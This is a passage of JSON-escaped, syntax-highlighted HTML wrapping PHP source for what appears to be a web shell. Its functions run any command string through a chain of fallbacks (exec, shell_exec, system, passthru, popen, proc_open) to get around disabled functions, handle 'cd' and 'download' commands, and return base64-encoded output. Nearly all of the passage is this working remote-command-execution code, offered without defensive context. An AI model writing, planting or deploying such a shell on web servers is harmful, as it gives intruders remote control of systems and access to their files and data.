class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003efunction_exists\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$entry\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eexecuteCommand\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efunction_exists\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;exec\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efunction_exists\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;shell_exec\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eshell_exec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eallFunctionExist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;system\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_start\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_get_contents\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_end_clean\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eob_start\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eob_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eob_end_clean\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eallFunctionExist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;passthru\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_start\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_get_contents\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ob_end_clean\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eob_start\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003epassthru\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eob_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eob_end_clean\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eallFunctionExist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;popen\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;feof\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;fread\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;pclose\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003efeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4096\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003epclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eallFunctionExist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;proc_open\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;stream_get_contents\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;proc_close\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eproc_open\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pipe\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pipe\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003estream_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eproc_close\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$handle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$output\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eisRunningWindows\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003estripos\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ePHP_OS\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;WIN\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003efeatureShell\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/^\\s*cd\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eexpandPath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;~\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelseif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/^\\s*cd\\s+(.+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/^\\s*cd\\s+([^\\s]+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eexpandPath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelseif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/^\\s*download\\s+[^\\s]+\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/^\\s*download\\s+([^\\s]+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efeatureDownload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eexecuteCommand\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;stdout\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;cwd\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003egetcwd\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 